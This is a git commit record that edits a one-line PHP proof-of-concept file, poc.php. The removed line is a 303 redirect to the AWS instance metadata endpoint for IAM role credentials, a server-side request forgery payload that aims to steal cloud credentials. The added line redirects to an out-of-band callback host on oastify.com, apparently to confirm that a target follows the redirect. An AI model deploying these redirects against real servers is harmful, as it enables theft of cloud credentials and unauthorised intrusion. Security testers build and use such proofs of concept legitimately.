aed87fd9d0e797eeb6520cc2c4bd5b69a461edb7
dV3920 <88095613+dV3920@users.noreply.github.com>
2024-12-02 23:44:00 +0700

    Update poc.php

--- poc.php
+++ poc.php
@@ -1,1 +1,1 @@
-<?php header('Location: http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-opsworks-ec2-role', TRUE, 303); ?>
+<?php header('Location: http://5tzcea8irpoe8r8xq4k0gopcg3muatyi.oastify.com', TRUE, 303); ?>
